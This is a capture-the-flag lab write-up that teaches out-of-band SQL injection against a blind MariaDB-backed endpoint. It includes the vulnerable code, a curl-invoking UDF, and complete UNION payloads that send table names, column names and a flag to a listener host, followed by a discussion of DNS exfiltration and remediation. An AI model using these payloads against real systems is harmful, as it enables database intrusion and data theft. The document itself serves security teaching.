# The Spell Card, Debrief

**Node:** `p3_1` · **Flag:** `SEIYAKU{word_left_the_island}` · **Route:** `GET /p3/spellcard` · **Sink:** `challenges/phase3.py`, `mariadb` (`cards` table, `sealed_cards` table) · **OOB primitive:** `http_get()` UDF (`udf/http_get.c`) · **Listener:** `collaborator` (proxied at `GET /p3/spellcard/captures`)

## Root cause

The card reader builds its query with raw f-string concatenation. `card`
sits inside a single-quoted string literal with no escaping — the same
sink shape as p1_1/p1_3:

```python
# challenges/phase3.py
q = f"SELECT effect FROM cards WHERE id='{card}'"  # VULN: string concat
cur.execute(q)
cur.fetchone()  # result deliberately discarded
```

What's different from every earlier floor is what happens after the
query runs. The result is thrown away — the application never relays it,
logs it, or does anything with it. The HTTP response is identical no
matter what `card` contains:

```python
return render_template("p3_spellcard.html", card=card)
```

`p3_spellcard.html` renders the same "the card was cast into the field"
message regardless of whether the lookup matched, whether it returned
one row or fifty, and whether the query raised. No boolean-blind,
error-based, or UNION-based channel is available in-band, not because
those techniques were patched, but because the response was deliberately
built to give them nothing to surface in.

The time-based channel takes one extra piece of machinery to close.
Swallowing errors and returning a constant page kills the boolean/error/
UNION signals, but not timing: if the query ran on the request path, an
injected `SLEEP(5)` would still stall the response by five seconds, and
that delay is a usable oracle. This floor closes that hole by running
the query in a **detached background thread** (`_run_card_query`), so
the handler returns the blind response before the query even starts.
Verified live: at `--level=3 --risk=3` sqlmap reports "all tested
parameters do not appear to be injectable", confirming every in-band
channel, timing included, is genuinely closed.

## What OOB SQL injection actually is

Out-of-band confirmation is the standard technique for exactly this
situation: a target where the tester can influence a backend query but
the application's own response carries zero data-dependent signal.

Instead of reading the result off the response that came back from the
request that triggered it, the tester makes the **target originate a
second, independent network call** — to a host the tester controls —
carrying the data they're after. The confirmation is read off that
separate channel, with no cooperation from the original response.

**Why the database, not the application.** In a naive approximation of
OOB SQLi, you might expect the *application* to relay results somewhere.
That's not OOB SQLi — it's just a normal app making an HTTP call after
reading from the DB. Real OOB SQLi is specifically about making the
*database engine itself* originate that outbound call, driven by SQL the
tester injected, with the application completely uninvolved. The
application doesn't need to have any relay code. The application doesn't
even need to be running. The injected SQL causes the call; the app is
irrelevant.

**Why this matters.** In a real engagement, you might be injecting into
a background job, a webhook handler, or any other path where you'll never
see a response. You can't add relay code to the app — you don't control
it. The only way to prove the injection executed and extract anything
from it is to make the database reach out to you directly.

## The OOB primitive: `http_get()` UDF

MariaDB on Linux has no built-in mechanism to originate outbound HTTP
or DNS calls (the Windows SMB/UNC-path trick that lets `LOAD_FILE()`
dial out doesn't apply on Linux; `FEDERATED` needs a privileged
install). To give this lab a realistic, database-native OOB channel,
the MariaDB image includes a custom User-Defined Function:

```c
// udf/http_get.c (compiled into /usr/lib/mysql/plugin/http_get.so
// by mariadb/Dockerfile, registered at startup by seed/mariadb/09_spellcard.sql)
char *http_get(UDF_INIT *initid, UDF_ARGS *args, ...) {
    // popen("curl -s --globoff -o /dev/null -w '%{http_code}' --max-time 5 -- \"<url>\"")
    // MariaDB's own process executes the curl call.
    // Return value: HTTP status code ("200", "404", ...)
}
```

Once registered (`CREATE FUNCTION http_get RETURNS STRING SONAME 'http_get.so'`),
any SQL session can call it:

```sql
SELECT http_get('http://collaborator/any/path');
-- → MariaDB's own process fires GET http://collaborator/any/path
-- → collaborator logs the request
-- → SQL caller gets back the HTTP status code
```

The `--globoff` flag is important: without it, curl treats `{` and `}` as
glob-expansion characters and would error on a URL path that contains the
flag format `SEIYAKU{...}`.

In a real-world engagement, a tester would either find a built-in
DB-native primitive that can do this (Oracle's `UTL_HTTP`, SQL Server's
`xp_dirtree` for DNS, etc.) or exploit a pre-existing UDF/stored
procedure that happens to make network calls. The `http_get()` UDF here
plays the role those primitives play on other platforms.

## The listener: `collaborator`

In a real engagement, the "host the tester controls" is a server they
own — a VPS, Burp Suite Professional's Collaborator, or a self-hosted
alternative like [interactsh](https://github.com/projectdiscovery/interactsh).

In this lab, that role is played by the `collaborator` compose service:
a simple HTTP (and DNS) server that logs every request it receives and
exposes them at `GET /captures`. It's only reachable from other
containers on the compose network (by its hostname `collaborator`), not
from your browser directly — which is why the portal proxies its captures
feed at `/p3/spellcard/captures`.

The challenge briefing tells you the listener's address. In a real
engagement you'd substitute your own Burp Collaborator domain or your
attacker-controlled server URL.

## The walk: hand-crafting the payload

`card` sits inside a single-quoted string context, same as p1_1 and
p1_3. Close the quote, kill the non-matching WHERE, and append a UNION
SELECT that calls `http_get()` with the flag embedded in the URL:

```
card = nonexistent' UNION SELECT http_get(CONCAT('http://collaborator/spellcard-cast/', secret)) FROM sealed_cards-- -
```

- `nonexistent'` closes the string literal; the WHERE no longer matches.
- `UNION SELECT ... FROM sealed_cards` appends a second result set with
  the same one-column shape (`effect` vs. the UDF's return value).
- `http_get(CONCAT('http://collaborator/spellcard-cast/', secret))` — for
  each row in `sealed_cards`, MariaDB calls the UDF with a URL that has
  the flag in the path. The UDF shells out to curl; curl fires the GET;
  collaborator logs it. The return value (HTTP status code) reaches the
  Flask route, which discards it.
- `-- -` comments out the original trailing quote.

### Sending it

```bash
curl -s -G "http://localhost:8000/p3/spellcard" \
    --data-urlencode "card=nonexistent' UNION SELECT http_get(CONCAT('http://collaborator/spellcard-cast/', secret)) FROM sealed_cards-- -"
```

The response is the identical blind confirmation text. Nothing in it
varies with the payload.

### Discovering the hidden table first (don't skip this step)

The payload above already knows the table is `sealed_cards` and the
column is `secret`. In a real engagement you'd enumerate first — using
the OOB channel itself as the feedback loop:

```bash
# What tables exist in this database?
curl -s -G "http://localhost:8000/p3/spellcard" \
    --data-urlencode "card=x' UNION SELECT http_get(CONCAT('http://collaborator/tables/', table_name)) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- -"
# → check captures: /tables/cards

# OFFSET 1:
# → check captures: /tables/sealed_cards

# What columns does sealed_cards have?
curl -s -G "http://localhost:8000/p3/spellcard" \
    --data-urlencode "card=x' UNION SELECT http_get(CONCAT('http://collaborator/cols/', column_name)) FROM information_schema.columns WHERE table_name='sealed_cards' LIMIT 1 OFFSET 0-- -"
# → check captures: /cols/id ... OFFSET 1 → /cols/card_name ... OFFSET 2 → /cols/secret
```

The OOB channel is your entire enumeration interface, not just the
final-flag step. Every query whose result you want to see goes through
`http_get()` and arrives at collaborator.

### Reading the confirmation

```bash
curl -s "http://localhost:8000/p3/spellcard/captures"
```

Real, live output from this exact seed (condensed):

```json
[
  {
    "type": "http",
    "method": "GET",
    "path": "/spellcard-cast/SEIYAKU{word_left_the_island}",
    "client_ip": "172.x.x.x"
  }
]
```

The flag is in the URL path of a real HTTP GET that MariaDB's own process
sent to collaborator — entirely separate from (and after) the blind
response the browser already received. The application sent nothing; the
database did it.

## Two OOB channel types, and why DNS is harder to block

This lab's `collaborator` service supports both HTTP and DNS capture.
This floor uses HTTP because `{` and `}` in the flag aren't valid DNS
label characters (a resolver typically drops the lookup), while an HTTP
path carries them fine after `--globoff` tells curl not to treat them as
glob patterns.

The DNS channel is the one real-world defenders consistently underestimate:

- **HTTP-based**: the database originates an outbound HTTP request. Easy
  to reason about, easy to filter — a network team that reviews egress
  from the database tier can catch it.
- **DNS-based**: the database resolves a hostname built from the
  exfiltrated data (`<data>.attacker-domain.com`). The tester reads the
  confirmation off DNS query logs on their own authoritative nameserver.
  DNS resolution is treated as infrastructure plumbing, not "a network
  request," by most egress controls — a host that blocks arbitrary
  outbound HTTP from a database server often still resolves hostnames
  freely. A single UDP packet to port 53 blends into completely ordinary
  background traffic. This is why real-world OOB tooling (and real
  attackers) prefer DNS exfiltration when HTTP egress is locked down.

The DNS side of `collaborator` is fully live for any future lesson that
teaches the DNS variant with data shaped to survive a DNS label (no
braces, hex-encoding or Base32-encoding the payload is standard).

## HxH analogy

Greed Island's game master is scrupulously consistent: every card
resolves through the same reporting channel, and that channel tells a
player nothing beyond "it happened." That consistency is the trap — it's
easy to mistake "the game master won't tell me" for "there's nothing to
find out." But the game master reading a card and *the game itself*
aren't the same thing. The field changes. Effects land. Word of what
actually happened can still leave the island, just not through the one
channel the game master is watching. This floor's lesson is literal: the
confirmation was never going to come back through the front door. It
travels through a channel nobody standing at that front door ever thought
to watch.

## Remediation

- **Parameterized queries, always** — the root fix, same as every floor:

  ```python
  cur.execute("SELECT effect FROM cards WHERE id=%s", (card,))
  ```

  This closes the injection regardless of whether the response is blind.
  A blind endpoint only changes how hard the bug is to detect, not
  whether it exists.

- **Remove or scope the `http_get()` UDF.** A UDF that unconditionally
  executes arbitrary outbound HTTP calls is a significant attack
  primitive. In a real deployment, any UDF that makes network calls
  should be scoped as narrowly as possible (fixed hosts, not
  attacker-controlled URLs), audited for injection into the command it
  builds, and granted only to accounts that genuinely need it.

- **Egress filtering on the database tier.** The reason OOB confirmation
  works at all is that outbound connections from the database server were
  possible in the first place. A database host with no route to arbitrary
  external hosts — or with an explicit allowlist enforced at the network
  layer — can't be coaxed into confirming anything via a UDF callback,
  regardless of how the underlying injection is shaped. Least-privilege
  egress is the single control that would have silenced this channel
  outright, independent of the query bug.

- **Least-privilege database accounts** — same as every floor: a DB user
  scoped only to the tables a route legitimately needs cannot reach
  `sealed_cards` or any other table the route's own queries never touch.
